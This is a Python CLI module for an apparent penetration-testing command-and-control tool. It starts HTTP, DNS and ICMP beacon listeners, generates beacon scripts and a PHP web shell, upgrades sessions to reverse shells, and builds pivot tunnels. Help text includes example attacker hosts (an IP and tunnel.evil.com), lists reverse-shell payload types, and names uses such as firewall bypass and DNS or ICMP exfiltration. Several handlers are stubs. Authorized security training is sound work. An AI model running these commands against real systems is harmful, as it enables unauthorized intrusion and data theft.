"""
Session management CLI interface.

Commands:
- session http-start: Start HTTP/HTTPS beacon listener
- session beacon-send: Send command to beacon
- session beacon-get: Get beacon response
- session beacon-gen: Generate beacon script
- session http-upgrade: Upgrade HTTP beacon to TCP reverse shell
- session list: List active sessions
- session info: Show session details
"""

import argparse
import sys
import time
from pathlib import Path

from .listeners.http_listener import HTTPListener
from .listeners.dns_listener import DNSListener
from .listeners.icmp_listener import ICMPListener
from .listeners.beacon_protocol import BeaconProtocol
from .shell.http_upgrader import HTTPShellUpgrader
from .storage.base import SessionStorage
from .config import SessionConfig
from .manager import SessionManager
from .events import EventBus


def http_start_command():
    """Start HTTP/HTTPS beacon listener."""
    parser = argparse.ArgumentParser(
        description='Start HTTP/HTTPS beacon listener',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start HTTP beacon listener
  crack session http-start --port 8080

  # Start HTTPS beacon listener
  crack session http-start --port 443 --https

  # Custom host binding
  crack session http-start --port 8080 --host 0.0.0.0

Usage Notes:
  - Beacon URL will be displayed on startup
  - Use beacon-gen to create beacon scripts
  - Use beacon-send to queue commands for beacons
  - Listener runs in background (daemonized)
        """
    )

    parser.add_argument('--port', '-p', type=int, default=8080,
                       help='Port to listen on (default: 8080)')
    parser.add_argument('--https', action='store_true',
                       help='Enable HTTPS with self-signed certificate')
    parser.add_argument('--host', default='0.0.0.0',
                       help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--cert', type=Path,
                       help='Path to SSL certificate (optional, auto-generated if HTTPS)')
    parser.add_argument('--key', type=Path,
                       help='Path to SSL private key (optional, auto-generated if HTTPS)')

    args = parser.parse_args()

    # TODO: Get session manager instance (for now, print instructions)
    print(f"[*] Starting HTTP{'S' if args.https else ''} beacon listener on {args.host}:{args.port}")
    print(f"[*] Beacon URL: {'https' if args.https else 'http'}://<LHOST>:{args.port}/beacon")
    print("\n[!] Session manager integration pending (Agent F1-A)")
    print("[!] Use standalone mode for now:")
    print(f"\n    python3 -m sessions.listeners.http_listener --port {args.port}")


def beacon_send_command():
    """Send command to beacon."""
    parser = argparse.ArgumentParser(
        description='Send command to HTTP beacon',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send whoami command
  crack session beacon-send abc123 "whoami"

  # Send enumeration command
  crack session beacon-send abc123 "uname -a"

  # Chain commands
  crack session beacon-send abc123 "whoami && id && hostname"

Usage Notes:
  - Commands are queued and executed on next beacon poll
  - Use beacon-get to retrieve command output
  - Session ID can be found with: crack session list
        """
    )

    parser.add_argument('session_id', help='Session identifier')
    parser.add_argument('command', help='Command to execute')

    args = parser.parse_args()

    print(f"[*] Queuing command for session {args.session_id}")
    print(f"[*] Command: {args.command}")
    print("\n[!] Session manager integration pending (Agent F1-A)")


def beacon_get_command():
    """Get beacon response."""
    parser = argparse.ArgumentParser(
        description='Get response from HTTP beacon',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Get last response
  crack session beacon-get abc123

  # Get all responses
  crack session beacon-get abc123 --all

  # Clear response history
  crack session beacon-get abc123 --clear

Usage Notes:
  - Responses are stored per-session
  - Maximum 100 responses kept per session
  - Use --all to see complete history
        """
    )

    parser.add_argument('session_id', help='Session identifier')
    parser.add_argument('--all', action='store_true',
                       help='Show all responses (not just last)')
    parser.add_argument('--clear', action='store_true',
                       help='Clear response history')

    args = parser.parse_args()

    print(f"[*] Retrieving responses for session {args.session_id}")
    print("\n[!] Session manager integration pending (Agent F1-A)")


def beacon_gen_command():
    """Generate beacon script."""
    parser = argparse.ArgumentParser(
        description='Generate beacon script',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate bash beacon
  crack session beacon-gen bash http://192.168.45.150:8080 --output beacon.sh

  # Generate PHP web shell beacon
  crack session beacon-gen php_web http://192.168.45.150:8080 --output shell.php

  # Generate PowerShell beacon
  crack session beacon-gen powershell http://192.168.45.150:8080 --output beacon.ps1

  # Custom interval and jitter
  crack session beacon-gen bash http://192.168.45.150:8080 --interval 10 --jitter 5

Available Beacon Types:
  - bash: Linux bash beacon (requires curl/wget)
  - php: PHP CLI beacon
  - php_web: PHP web shell with beacon functionality
  - powershell: Windows PowerShell beacon
  - python: Python beacon (cross-platform)

Usage Notes:
  - Session ID is auto-generated (UUID)
  - Upload beacon script to target
  - Execute on target to register with listener
  - Use beacon-send to queue commands
        """
    )

    parser.add_argument('type', choices=['bash', 'php', 'php_web', 'powershell', 'python'],
                       help='Beacon script type')
    parser.add_argument('listener_url', help='Listener URL (http://LHOST:PORT)')
    parser.add_argument('--output', '-o', type=Path,
                       help='Output file path (default: stdout)')
    parser.add_argument('--interval', '-i', type=int, default=5,
                       help='Beacon interval in seconds (default: 5)')
    parser.add_argument('--jitter', '-j', type=int, default=0,
                       help='Random jitter in seconds (default: 0)')
    parser.add_argument('--session-id', help='Session ID (auto-generated if not provided)')

    args = parser.parse_args()

    # Generate session ID if not provided
    import uuid
    session_id = args.session_id or str(uuid.uuid4())

    # Generate beacon script
    protocol = BeaconProtocol()
    script = protocol.generate_beacon_script(
        beacon_type=args.type,
        listener_url=args.listener_url,
        session_id=session_id,
        interval=args.interval,
        jitter=args.jitter
    )

    # Output
    if args.output:
        args.output.write_text(script)
        print(f"[+] Beacon script written to: {args.output}")
        print(f"[*] Session ID: {session_id}")
        print(f"[*] Beacon URL: {args.listener_url}/beacon")
        print(f"[*] Interval: {args.interval}s (jitter: {args.jitter}s)")
        print("\n[*] Next steps:")
        print(f"    1. Upload {args.output} to target")
        print(f"    2. Execute on target: bash {args.output} (or equivalent)")
        print(f"    3. Wait for beacon registration")
        print(f"    4. Send commands: crack session beacon-send {session_id[:8]}... <command>")
    else:
        print(script)


def http_upgrade_command():
    """Upgrade HTTP beacon to TCP reverse shell."""
    parser = argparse.ArgumentParser(
        description='Upgrade HTTP beacon to TCP reverse shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-detect capabilities and upgrade
  crack session http-upgrade abc123 --lhost 192.168.45.150 --lport 4444

  # Force specific payload type
  crack session http-upgrade abc123 --lhost 192.168.45.150 --lport 4444 --payload python3

  # Custom timeout
  crack session http-upgrade abc123 --lhost 192.168.45.150 --lport 4444 --timeout 60

Available Payload Types:
  - bash: Bash TCP reverse shell (/dev/tcp)
  - bash_mkfifo: Bash reverse shell with named pipe
  - nc_e: Netcat with -e flag
  - nc_c: Netcat with -c flag
  - python: Python 2 reverse shell
  - python3: Python 3 reverse shell
  - perl: Perl reverse shell
  - php: PHP reverse shell
  - ruby: Ruby reverse shell
  - powershell: PowerShell reverse shell

Usage Notes:
  - Auto-detection tests for available tools
  - TCP listener is started automatically
  - Waits for reverse shell connection
  - Original HTTP session marked as 'upgraded'
  - New TCP session created on success
        """
    )

    parser.add_argument('session_id', help='HTTP session identifier')
    parser.add_argument('--lhost', required=True, help='Listener host (your IP)')
    parser.add_argument('--lport', type=int, required=True, help='Listener port')
    parser.add_argument('--payload', help='Payload type (auto-detected if not specified)')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Connection timeout in seconds (default: 30)')

    args = parser.parse_args()

    print(f"[*] Upgrading HTTP session {args.session_id} to TCP reverse shell")
    print(f"[*] Listener: {args.lhost}:{args.lport}")
    print(f"[*] Timeout: {args.timeout}s")

    if args.payload:
        print(f"[*] Payload type: {args.payload}")
    else:
        print("[*] Payload type: auto-detect")

    print("\n[!] Session manager integration pending (Agent F1-A)")
    print("[!] This will:")
    print("    1. Detect target capabilities")
    print("    2. Generate reverse shell payload")
    print("    3. Start TCP listener on specified port")
    print("    4. Inject payload via beacon")
    print("    5. Wait for connection")
    print("    6. Create new TCP session")


def list_command():
    """List active sessions."""
    parser = argparse.ArgumentParser(
        description='List active sessions',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # List all sessions
  crack session list

  # List HTTP sessions only
  crack session list --type http

  # List active sessions only
  crack session list --status active

Usage Notes:
  - Shows session ID, type, target, status
  - Use 'crack session info <ID>' for details
        """
    )

    parser.add_argument('--type', help='Filter by session type (tcp, http)')
    parser.add_argument('--status', help='Filter by status (active, dead, upgraded)')

    args = parser.parse_args()

    print("[*] Active sessions:")
    print("\n[!] Session manager integration pending (Agent F1-A)")


def info_command():
    """Show session details."""
    parser = argparse.ArgumentParser(
        description='Show session details',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Show session details
  crack session info abc123

Usage Notes:
  - Shows complete session metadata
  - Includes capabilities, metadata, timestamps
        """
    )

    parser.add_argument('session_id', help='Session identifier')

    args = parser.parse_args()

    print(f"[*] Session details for {args.session_id}")
    print("\n[!] Session manager integration pending (Agent F1-A)")


def dns_start_command():
    """Start DNS tunnel listener."""
    parser = argparse.ArgumentParser(
        description='Start DNS tunnel listener (iodine or dnscat2)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start iodine DNS tunnel
  sudo crack session dns-start --domain tunnel.evil.com

  # Start dnscat2 DNS C2
  sudo crack session dns-start --domain tunnel.evil.com --tool dnscat2

  # Custom password
  sudo crack session dns-start --domain tunnel.evil.com --password secret123

Usage Notes:
  - Requires root privileges (port 53)
  - Domain must be authoritative (DNS delegation required)
  - Client command displayed on startup
  - Iodine creates VPN-like tunnel (10.0.0.1/24)
  - Dnscat2 provides interactive C2 shell

OSCP Use Case:
  - Bypass firewall that only allows DNS
  - Exfiltrate data via DNS queries
  - Establish reverse shell over DNS tunnel
  - Pivot through DNS-only network segments

Setup Requirements:
  - Iodine: apt-get install iodine
  - Dnscat2: git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2
  - DNS delegation: NS record pointing to your server
        """
    )

    parser.add_argument('--domain', '-d', required=True,
                       help='Authoritative domain name (e.g., tunnel.evil.com)')
    parser.add_argument('--tool', choices=['iodine', 'dnscat2'], default='iodine',
                       help='DNS tunnel tool (default: iodine)')
    parser.add_argument('--password', help='Password for iodine (auto-generated if not provided)')
    parser.add_argument('--secret', help='Secret for dnscat2 (auto-generated if not provided)')
    parser.add_argument('--tunnel-network', default='10.0.0.1',
                       help='Tunnel network for iodine (default: 10.0.0.1)')

    args = parser.parse_args()

    print(f"[*] Starting DNS tunnel listener ({args.tool})")
    print(f"[*] Domain: {args.domain}")

    # Initialize session manager
    storage = SessionStorage()
    config = SessionConfig()
    manager = SessionManager(storage, config)

    # Create DNS listener
    listener = DNSListener(
        domain=args.domain,
        session_manager=manager,
        tool=args.tool,
        password=args.password,
        tunnel_network=args.tunnel_network,
        secret=args.secret
    )

    try:
        # Start listener
        if listener.start():
            print("\n[+] DNS tunnel listener started successfully")
            print(f"[+] Tool: {args.tool}")
            print(f"[+] Domain: {args.domain}")

            # Get listener info
            info = listener.get_listener_info()

            if args.tool == 'iodine':
                print(f"[+] Password: {info['password']}")
                print(f"[+] Tunnel network: {info['tunnel_network']}/24")
            elif args.tool == 'dnscat2':
                print(f"[+] Secret: {info['secret']}")

            print(f"\n[+] Client command:")
            print(f"    {info['client_command']}")

            print("\n[*] Listener running. Press Ctrl+C to stop.")

            # Keep running
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n[*] Stopping DNS listener...")
                listener.stop()
                print("[+] DNS listener stopped")

    except Exception as e:
        print(f"\n[!] Failed to start DNS listener: {e}")
        sys.exit(1)


def icmp_start_command():
    """Start ICMP tunnel listener."""
    parser = argparse.ArgumentParser(
        description='Start ICMP tunnel listener (ptunnel or icmpsh)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start ptunnel ICMP tunnel
  sudo crack session icmp-start

  # Start icmpsh ICMP shell
  sudo crack session icmp-start --tool icmpsh

  # Custom password for ptunnel
  sudo crack session icmp-start --password secret123

  # Specify expected target IP for icmpsh
  sudo crack session icmp-start --tool icmpsh --target 192.168.45.150

Usage Notes:
  - Requires root privileges (raw sockets)
  - Client command displayed on startup
  - Ptunnel forwards TCP traffic over ICMP
  - Icmpsh provides interactive shell over ICMP

OSCP Use Case:
  - Bypass firewall that only allows ICMP (ping)
  - Exfiltrate data via ICMP payloads
  - Establish reverse shell over ICMP tunnel
  - Pivot through ICMP-only network segments

Setup Requirements:
  - Ptunnel: apt-get install ptunnel
  - Icmpsh: git clone https://github.com/bdamele/icmpsh.git /opt/icmpsh

Client Commands:
  Ptunnel:
    ptunnel -p <server_ip> -lp 8000 -da <dest_ip> -dp 80 -x <password>
    # Access localhost:8000 -> tunneled to dest:80 via ICMP

  Icmpsh:
    icmpsh.exe -t <server_ip>
    # Interactive shell over ICMP
        """
    )

    parser.add_argument('--tool', choices=['ptunnel', 'icmpsh'], default='ptunnel',
                       help='ICMP tunnel tool (default: ptunnel)')
    parser.add_argument('--password', help='Password for ptunnel (auto-generated if not provided)')
    parser.add_argument('--target', help='Expected target IP for icmpsh (optional)')

    args = parser.parse_args()

    print(f"[*] Starting ICMP tunnel listener ({args.tool})")

    # Initialize session manager
    storage = SessionStorage()
    config = SessionConfig()
    manager = SessionManager(storage, config)

    # Create ICMP listener
    listener = ICMPListener(
        session_manager=manager,
        tool=args.tool,
        password=args.password,
        target_ip=args.target
    )

    try:
        # Start listener
        if listener.start():
            print("\n[+] ICMP tunnel listener started successfully")
            print(f"[+] Tool: {args.tool}")

            # Get listener info
            info = listener.get_listener_info()

            if args.tool == 'ptunnel':
                print(f"[+] Password: {info['password']}")
                print(f"\n[+] Client command (example):")
                print(f"    {listener.get_client_command('<server_ip>', '<dest_ip>', 80)}")
                print(f"\n[*] This tunnels localhost:8000 -> dest_ip:80 via ICMP")
            elif args.tool == 'icmpsh':
                print(f"[+] WARNING: Kernel ICMP replies disabled")
                print(f"\n[+] Client command:")
                print(f"    {info['client_command']}")

            print("\n[*] Listener running. Press Ctrl+C to stop.")

            # Keep running
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n[*] Stopping ICMP listener...")
                listener.stop()
                print("[+] ICMP listener stopped")

    except Exception as e:
        print(f"\n[!] Failed to start ICMP listener: {e}")
        sys.exit(1)


def tunnel_create_command():
    """Create tunnel for session."""
    parser = argparse.ArgumentParser(
        description='Create tunnel for pivoting/port forwarding',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SSH local forward (access victim's internal MySQL)
  crack session tunnel-create abc123 --type ssh-local --local-port 3306 --remote-host 192.168.1.10 --remote-port 3306 --username user

  # SSH SOCKS proxy (route all tools through victim)
  crack session tunnel-create abc123 --type ssh-dynamic --socks-port 1080 --username user

  # Socat relay (simple port forward)
  crack session tunnel-create abc123 --type socat --local-port 8080 --remote-host 192.168.1.10 --remote-port 80

Tunnel Types:
  ssh-local:     SSH local port forward (-L)
  ssh-remote:    SSH remote port forward (-R)
  ssh-dynamic:   SSH SOCKS proxy (-D)
  chisel:        Chisel HTTP tunnel
  socat:         Socat relay
  proxychains:   Generate proxychains config

Usage Notes:
  - Use tunnel-list to see active tunnels
  - Use tunnel-kill to terminate tunnel
  - Port conflicts are automatically detected
  - Tunnels are tracked per session
        """
    )

    parser.add_argument('session_id', help='Session identifier')
    parser.add_argument('--type', required=True,
                       choices=['ssh-local', 'ssh-remote', 'ssh-dynamic', 'chisel', 'socat', 'proxychains'],
                       help='Tunnel type')
    parser.add_argument('--local-port', type=int, help='Local port to bind')
    parser.add_argument('--remote-host', help='Remote host to connect to')
    parser.add_argument('--remote-port', type=int, help='Remote port to connect to')
    parser.add_argument('--socks-port', type=int, help='SOCKS proxy port')
    parser.add_argument('--username', help='SSH username (for SSH tunnels)')
    parser.add_argument('--password', help='SSH password (for SSH tunnels)')
    parser.add_argument('--key-file', type=Path, help='SSH private key file (for SSH tunnels)')

    args = parser.parse_args()

    print(f"[*] Creating {args.type} tunnel for session {args.session_id}")
    print("\n[!] Tunnel manager integration pending (Agent F2-A)")
    print("[!] This will:")
    print(f"    1. Validate port availability")
    print(f"    2. Create {args.type} tunnel")
    print(f"    3. Track tunnel process")
    print(f"    4. Auto-cleanup on session death")


def tunnel_list_command():
    """List active tunnels."""
    parser = argparse.ArgumentParser(
        description='List active tunnels',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # List all tunnels
  crack session tunnel-list

  # List tunnels for specific session
  crack session tunnel-list --session abc123

  # List active tunnels only
  crack session tunnel-list --status active

Usage Notes:
  - Shows tunnel ID, type, connection string, status
  - Use 'crack session tunnel-kill <ID>' to terminate
        """
    )

    parser.add_argument('--session', help='Filter by session ID')
    parser.add_argument('--status', help='Filter by status (active, dead)')

    args = parser.parse_args()

    print("[*] Active tunnels:")
    print("\n[!] Tunnel manager integration pending (Agent F2-A)")


def tunnel_kill_command():
    """Kill tunnel."""
    parser = argparse.ArgumentParser(
        description='Terminate tunnel',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Kill tunnel by ID
  crack session tunnel-kill abc123

Usage Notes:
  - Terminates tunnel process
  - Updates tunnel status to 'dead'
  - Use 'crack session tunnel-list' to find tunnel IDs
        """
    )

    parser.add_argument('tunnel_id', help='Tunnel identifier')

    args = parser.parse_args()

    print(f"[*] Killing tunnel {args.tunnel_id}")
    print("\n[!] Tunnel manager integration pending (Agent F2-A)")


def main():
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        description='Session management system',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  http-start      Start HTTP/HTTPS beacon listener
  dns-start       Start DNS tunnel listener (iodine/dnscat2)
  icmp-start      Start ICMP tunnel listener (ptunnel/icmpsh)
  beacon-send     Send command to beacon
  beacon-get      Get beacon response
  beacon-gen      Generate beacon script
  http-upgrade    Upgrade HTTP beacon to TCP reverse shell
  list            List active sessions
  info            Show session details
  tunnel-create   Create tunnel for session (SSH/chisel/socat)
  tunnel-list     List active tunnels
  tunnel-kill     Kill tunnel

Examples:
  # Start HTTP beacon listener
  crack session http-start --port 8080

  # Start DNS tunnel (requires root)
  sudo crack session dns-start --domain tunnel.evil.com

  # Start ICMP tunnel (requires root)
  sudo crack session icmp-start

  # Generate bash beacon script
  crack session beacon-gen bash http://192.168.45.150:8080 -o beacon.sh

  # Send command to beacon
  crack session beacon-send abc123 "whoami"

  # Upgrade to TCP reverse shell
  crack session http-upgrade abc123 --lhost 192.168.45.150 --lport 4444

  # Create SSH tunnel
  crack session tunnel-create abc123 --type ssh-local --local-port 3306 --remote-host 192.168.1.10 --remote-port 3306

  # List sessions
  crack session list
        """
    )

    parser.add_argument('command', help='Command to execute',
                       choices=['http-start', 'dns-start', 'icmp-start', 'beacon-send',
                               'beacon-get', 'beacon-gen', 'http-upgrade', 'list', 'info',
                               'tunnel-create', 'tunnel-list', 'tunnel-kill'])

    # Parse just the command
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    command = sys.argv[1]

    # Remove command from argv and dispatch
    sys.argv = [sys.argv[0]] + sys.argv[2:]

    commands = {
        'http-start': http_start_command,
        'dns-start': dns_start_command,
        'icmp-start': icmp_start_command,
        'beacon-send': beacon_send_command,
        'beacon-get': beacon_get_command,
        'beacon-gen': beacon_gen_command,
        'http-upgrade': http_upgrade_command,
        'list': list_command,
        'info': info_command,
        'tunnel-create': tunnel_create_command,
        'tunnel-list': tunnel_list_command,
        'tunnel-kill': tunnel_kill_command
    }

    if command in commands:
        commands[command]()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
